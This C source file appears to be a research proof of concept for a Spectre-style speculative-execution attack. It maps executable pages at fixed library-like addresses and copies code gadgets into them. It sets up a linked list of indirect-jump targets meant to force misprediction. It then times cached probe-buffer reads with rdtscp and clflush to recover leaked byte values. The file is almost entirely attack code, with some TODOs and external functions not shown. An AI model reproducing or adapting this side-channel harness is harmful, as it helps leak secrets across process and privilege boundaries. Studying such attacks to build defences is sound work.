#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>



void __attribute__((section(".fnptr"))) (*fn_ptr)(void);


#define PAGE_SIZE 0x1000
#define MAX_PAGES 100
#define NUM_PROBES 256

#define MAX_PROBE_SPACE (1000003)
uint16_t signal_idx = 0;
double avgpct = 0;

uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
uint8_t __attribute__((section(".probe_buf"))) *probe_buf;

uint64_t results[NUM_PROBES];

uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
uint64_t tot_time = 0;      // Number cycles total

unsigned int junk=0;    // For rdtscp

unsigned int junk2=0;


void check_probes() {
    uint64_t t0, t1;
    uint8_t *addr;

    int i, mix_i;
    for (i=0; i<NUM_PROBES; i++) {
        //mix_i = ((i*13) + 7) & 0xff;
        mix_i = i;
        addr = &probe_buf[mix_i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[mix_i]++;
            //printf("# %lu\n", t1-t0);
            //_mm_clflush(addr);
        }
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<NUM_PROBES; i++) {
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }
    //usleep(100);
}




uint64_t loaded_pages[MAX_PAGES];
int loaded_pages_idx = 0;

void load_page(uint64_t addr)
{
    uint64_t page = addr & ~(PAGE_SIZE-1);
    int i;
    for (i=0; i<loaded_pages_idx; i++) {
        if (loaded_pages[i] == page) {
            // Already loaded
            return;
        }
    }
    loaded_pages[loaded_pages_idx++] = page;

    void *map = mmap((void*)page, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (map == ((void*)-1)) {
        printf("Error mapping %lx (page %lx):\n", addr, page);
        perror("mmap");
        exit(-1);
    }
    printf("Mapped %p -> %p\n", (void*)page, map);

    // Fill with returns:
    memset(map, '\xc3', PAGE_SIZE);
}

void addr_0x7ffff74d2970();
void addr_0x7ffff74d2a50();
void addr_0x7ffff778b8f0();
void addr_0x7ffff77e3380();
void addr_0x7ffff77e33ac();
void addr_0x7ffff77e343d();
void addr_0x7ffff77e3466();
void addr_0x7ffff77e36e0();
void addr_0x7ffff77e37a0();
void addr_0x7ffff77e38e0();
void addr_0x7ffff77e39db();
void addr_0x7ffff77e3a24();
void addr_0x7ffff77e3ae0();
void addr_0x7ffff77e3b33();
void addr_0x7ffff77e3bf9();
void addr_0x7ffff77e3cb8();
void addr_0x7ffff77e3d50();
void addr_0x7ffff77e3e22();
void addr_0x7ffff77e3e7d();
void addr_0x7ffff77e3f50();
void addr_0x7ffff77e6bb0();
void addr_0x7ffff77e6ce0();
void addr_0x7ffff77e6cf0();
void addr_0x7ffff77e7130();
void addr_0x7ffff77e7bb0();
void addr_0x7ffff77e7bc8();
void addr_0x7ffff77e7cc0();
void addr_0x7ffff77e7d18();
void addr_0x7ffff77e7d28();
void addr_0x7ffff77e7d40();
void addr_0x7ffff77e7d72();
void addr_0x7ffff77e7db0();
void addr_0x7ffff77e8320();
void addr_0x7ffff77e834d();
void addr_0x7ffff77e83ff();
void addr_0x7ffff77e93e0();
void addr_0x7ffff77e9520();
void addr_0x7ffff77e9589();
void addr_0x7ffff77eafd0();
void addr_0x7ffff77eb061();
void addr_0x7ffff77eb0a0();
void addr_0x7ffff77eb0b8();
void addr_0x7ffff77eb180();
void addr_0x7ffff77eb231();
void addr_0x7ffff77eb2b8();
void addr_0x7ffff77ecc38();
void addr_0x7ffff77ee7c0();
void addr_0x7ffff77ee89d();
void addr_0x7ffff77ee980();
void addr_0x7ffff77ee990();
void addr_0x7ffff77ee9c0();
void addr_0x7ffff77ee9d0();



void setup()
{
	load_page(0x7ffff74d2000);
	memcpy((void*)0x7ffff74d2970, addr_0x7ffff74d2970, 30);
	memcpy((void*)0x7ffff74d2a50, addr_0x7ffff74d2a50, 15);
	load_page(0x7ffff778b000);
	memcpy((void*)0x7ffff778b8f0, addr_0x7ffff778b8f0, 5);
	load_page(0x7ffff77e3000);
	memcpy((void*)0x7ffff77e3380, addr_0x7ffff77e3380, 30);
	memcpy((void*)0x7ffff77e33ac, addr_0x7ffff77e33ac, 64);
	memcpy((void*)0x7ffff77e343d, addr_0x7ffff77e343d, 27);
	memcpy((void*)0x7ffff77e3466, addr_0x7ffff77e3466, 5);
	memcpy((void*)0x7ffff77e36e0, addr_0x7ffff77e36e0, 33);
	memcpy((void*)0x7ffff77e37a0, addr_0x7ffff77e37a0, 20);
	memcpy((void*)0x7ffff77e38e0, addr_0x7ffff77e38e0, 225); // was 165
	memcpy((void*)0x7ffff77e39db, addr_0x7ffff77e39db, 13);
	memcpy((void*)0x7ffff77e3a24, addr_0x7ffff77e3a24, 41);
	memcpy((void*)0x7ffff77e3ae0, addr_0x7ffff77e3ae0, 73);
	memcpy((void*)0x7ffff77e3b33, addr_0x7ffff77e3b33, 190);
	memcpy((void*)0x7ffff77e3bf9, addr_0x7ffff77e3bf9, 145);
	memcpy((void*)0x7ffff77e3cb8, addr_0x7ffff77e3cb8, 149);
	memcpy((void*)0x7ffff77e3d50, addr_0x7ffff77e3d50, 129);
	memcpy((void*)0x7ffff77e3e22, addr_0x7ffff77e3e22, 21);
	memcpy((void*)0x7ffff77e3e7d, addr_0x7ffff77e3e7d, 50);
	memcpy((void*)0x7ffff77e3f50, addr_0x7ffff77e3f50, 9);
	load_page(0x7ffff77e6000);
	memcpy((void*)0x7ffff77e6bb0, addr_0x7ffff77e6bb0, 68);
	memcpy((void*)0x7ffff77e6ce0, addr_0x7ffff77e6ce0, 7);
	memcpy((void*)0x7ffff77e6cf0, addr_0x7ffff77e6cf0, 26);
	load_page(0x7ffff77e7000);
	memcpy((void*)0x7ffff77e7130, addr_0x7ffff77e7130, 55);
	memcpy((void*)0x7ffff77e7bb0, addr_0x7ffff77e7bb0, 14);
	memcpy((void*)0x7ffff77e7bc8, addr_0x7ffff77e7bc8, 50);
	memcpy((void*)0x7ffff77e7cc0, addr_0x7ffff77e7cc0, 60);
	memcpy((void*)0x7ffff77e7d18, addr_0x7ffff77e7d18, 11);
	memcpy((void*)0x7ffff77e7d28, addr_0x7ffff77e7d28, 5);
	memcpy((void*)0x7ffff77e7d40, addr_0x7ffff77e7d40, 41);
	memcpy((void*)0x7ffff77e7d72, addr_0x7ffff77e7d72, 55); // was 53
	memcpy((void*)0x7ffff77e7db0, addr_0x7ffff77e7db0, 11);
	load_page(0x7ffff77e8000);
	memcpy((void*)0x7ffff77e8320, addr_0x7ffff77e8320, 34);
	memcpy((void*)0x7ffff77e834d, addr_0x7ffff77e834d, 48);
	memcpy((void*)0x7ffff77e83ff, addr_0x7ffff77e83ff, 15);
	load_page(0x7ffff77e9000);
	memcpy((void*)0x7ffff77e93e0, addr_0x7ffff77e93e0, 127);
	memcpy((void*)0x7ffff77e9520, addr_0x7ffff77e9520, 94);
	memcpy((void*)0x7ffff77e9589, addr_0x7ffff77e9589, 25);
	load_page(0x7ffff77ea000);
	load_page(0x7ffff77eb000);
	memcpy((void*)0x7ffff77eafd0, addr_0x7ffff77eafd0, 80);

	memcpy((void*)0x7ffff77eb061, addr_0x7ffff77eb061, 58);
	memcpy((void*)0x7ffff77eb0a0, addr_0x7ffff77eb0a0, 19);
	memcpy((void*)0x7ffff77eb0b8, addr_0x7ffff77eb0b8, 86);
	memcpy((void*)0x7ffff77eb180, addr_0x7ffff77eb180, 138);
	memcpy((void*)0x7ffff77eb231, addr_0x7ffff77eb231, 16);
	memcpy((void*)0x7ffff77eb2b8, addr_0x7ffff77eb2b8, 100);
	load_page(0x7ffff77ec000);
	memcpy((void*)0x7ffff77ecc38, addr_0x7ffff77ecc38, 164);
	load_page(0x7ffff77ee000);
	memcpy((void*)0x7ffff77ee7c0, addr_0x7ffff77ee7c0, 170);
	memcpy((void*)0x7ffff77ee89d, addr_0x7ffff77ee89d, 4);
	memcpy((void*)0x7ffff77ee980, addr_0x7ffff77ee980, 12);
	memcpy((void*)0x7ffff77ee990, addr_0x7ffff77ee990, 25);
	memcpy((void*)0x7ffff77ee9c0, addr_0x7ffff77ee9c0, 12);
	memcpy((void*)0x7ffff77ee9d0, addr_0x7ffff77ee9d0, 25);



}

// single-linked list
struct node {
    void *next;  // list pointer
    void *jmp;   // "data" (indirect jump location)
};




uint64_t *ptr_space;
void *the_ptr;


void do_pattern(void *);

void nop()
{

}


int main()
{

    int i;
    int misses = 0;
    uint64_t tot_pattern = 0;
    uint64_t t0=0, t1=0;


    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }




    ptr_space = malloc(4096*10*sizeof(uint64_t));
    if (!ptr_space) {
        perror("malloc");
        return -1;
    }


    for (i=0; i<10; i++) {
        memset(&ptr_space[i*4096], i, 4096);
        _mm_clflush(&probe_buf[i*4096]);
    }

    ptr_space[10324] = (uint64_t)(void*)check_probes;

    // Our speculative jump has two in-order targets:
    // We would like the first one to be quick,
    // and the second one slow (so it gets mispeculated)
    // Solution: (hack) make a single linked list
    // of targets. Cache the first one, uncache the second element.
    // each time we hit the indirect jump we ultimately want to stall
    // (at address 0x7ffff77e7da6), we walk the singly-linked list
    // pointer forward, and call that function
    //
    // this is the second pointer (where we will ACTUALLY jump to),
    // which we will stall by making n2->jmp uncached.
    struct node *n3 = malloc(sizeof(struct node));

    n3->next = NULL;
    n3->jmp = &ptr_space[10324];
    // TODO: uncache n2->jmp


    struct node n1, n2;
    n1.next = &n2;
    n2.next = n3;
    // This is the address of our first indirect jump (quick)
    void *ptr1 = (void*)0x7ffff77e396d;
    void *ptr2 = (void*)0x7ffff77e3978;
    n1.jmp = &ptr1; //&ptr_space[10324];    // TODO: make this less ugly?
    n2.jmp = &ptr2;


    //void *ptr = &the_ptr;
    setup();
    while (1) {
        //_mm_clflush(n2->jmp);
        for (i=0; i<10000; i++) {
            n3->jmp = &ptr_space[i];
            ptr_space[i] = (uint64_t)(void*)check_probes;
            //_mm_clflush(n2->jmp);
            //_mm_clflush(&n2->jmp);
            _mm_clflush(&ptr_space[i]);
            _mm_clflush(n3);
            //_mm_clflush(&ptr_space[10324]);
            //_mm_clflush(n1.next);
            //spec_entry();
            //((void(*)(void))0x7ffff77e3978)();
            //check_probes();
            //t0 = _rdtscp(&junk2);
            do_pattern(&n1);
            //t1 = _rdtscp(&junk2);
            //tot_pattern += (t1-t0);
            usleep(1);
        }
        //printf("took %ld cylces average\n", tot_pattern/10000);
        tot_pattern = 0 ;

        // Check stats...
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        uint64_t max_res=0, max_i=0;
        int mix_i;
        for (i=0; i<NUM_PROBES; i++) {
            if (results[i]>max_res) {
                max_res = results[i];
                max_i = i;
            }
        }

        if ((max_res > 10 && avg < 55) || (max_res > 2 && avg < 30)){
            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n",
            max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);

            signal_idx++;
            misses = 0;

        } else {
            printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }

        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;
        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        usleep(1000);
    }
}

